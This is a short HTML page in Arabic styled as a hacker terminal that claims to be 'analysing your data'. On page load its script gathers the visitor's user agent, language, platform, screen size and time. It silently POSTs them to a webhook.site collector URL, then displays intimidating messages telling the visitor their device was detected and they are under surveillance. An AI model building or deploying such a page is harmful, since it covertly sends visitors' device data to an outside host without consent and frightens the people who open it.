<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>جاري الاتصال...</title>
    <style>
        body { background: #0a0a0a; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding: 50px; }
        h1 { font-size: 3em; text-shadow: 0 0 20px #0f0; }
        .status { border: 1px solid #0f0; padding: 20px; margin: 20px auto; max-width: 400px; border-radius: 10px; }
    </style>
</head>
<body>
    <h1>⚡ الاتصال المشفر ⚡</h1>
    <div class="status" id="status">
        <p>جارٍ تحليل بياناتك...</p>
        <p id="progress">[████████░░░░] 65%</p>
    </div>
    <script>
    const info = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screenWidth: screen.width,
        screenHeight: screen.height,
        time: new Date().toISOString()
    };

    setTimeout(() => {
        document.getElementById('progress').textContent = '[███████████░] 85%';
    }, 2000);

    setTimeout(() => {
        document.getElementById('progress').textContent = '[████████████] 100%';
    }, 4000);

    setTimeout(() => {
        fetch('https://webhook.site/62803c1e-6b3c-47c2-af75-81e561c41e8c', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(info)
        })
        .then(() => {
            document.getElementById('status').innerHTML = `
                <p style="color:#ff0000;">⚠️ تم اكتشاف جهازك.</p>
                <p>📱 نظام التشغيل: ${info.platform}</p>
                <p>🌐 اللغة: ${info.language}</p>
                <p>📏 دقة الشاشة: ${info.screenWidth}x${info.screenHeight}</p>
                <p>🕒 الوقت: ${new Date(info.time).toLocaleTimeString()}</p>
                <p style="color:#ff0000;font-size:1.2em;">🔴 أنت تحت المراقبة.</p>
            `;
        })
        .catch(() => {});
    }, 6000);
    </script>
</body>
</html>
